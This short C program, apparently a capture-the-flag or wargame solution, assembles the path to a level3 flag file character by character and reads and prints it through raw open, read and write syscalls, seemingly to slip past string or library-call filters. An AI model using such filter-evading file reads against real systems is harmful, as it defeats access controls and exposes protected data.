#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

int main(){
unsigned char fn[22];
fn[0] = '/';
fn[1] = 'h';
fn[2] = 'o';
fn[3] = 'm';
fn[4] = 'e';
fn[5] = '/';
fn[6] = 'l';
fn[7] = 'e';
fn[8] = 'v';
fn[9] = 'e';
fn[10] = 'l';
fn[11] = '3';
fn[12] = '/';
fn[13] = 'f';
fn[14] = 'l';
fn[15] = 'a';
fn[16] = 'g';
fn[17] = '.';
fn[18] = 't';
fn[19] = 'x';
fn[20] = 't';
fn[21] = '\0';

  int fd;
  char buf[256];

  fd = syscall(2,fn,0);
  syscall(0, fd, buf, sizeof(buf));
  syscall(1, 1, buf, sizeof(buf));
}
